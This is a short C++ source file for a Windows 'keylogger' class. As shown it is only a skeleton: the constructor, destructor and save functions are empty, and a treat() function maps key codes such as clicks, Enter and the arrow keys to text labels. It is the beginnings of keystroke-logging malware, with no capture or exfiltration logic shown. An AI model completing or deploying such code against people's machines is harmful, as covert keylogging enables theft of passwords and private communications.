#include "./keylogger.hpp"

using namespace std;

keylogger* g_keylogger;

keylogger::keylogger()
{

}

keylogger::~keylogger()
{

}

void keylogger::save(int p_key)
{

}

void keylogger::save(LPCSTR p_key)
{
}

void keylogger::treat(int p_key)
{
	switch (p_key)
	{
		case 1:
			save("[LEFT_CLICK]");
			break;
		case 2:
			save("[RIGHT_CLICK]");
			break;
		case 8:
			save("[BACKSPACE]");
			break;
		case 13:
			save("[ENTER]\r\n");
			break;
		case 37:
			save("[LEFT]");
			break;
		case 38:
			save("[UP]");
			break;
		case 39:
			save("[RIGHT]");
			break;
		case 40:
			save("[DOWN]");
			break;

		default:
			save(p_key);
		break;
	}
}
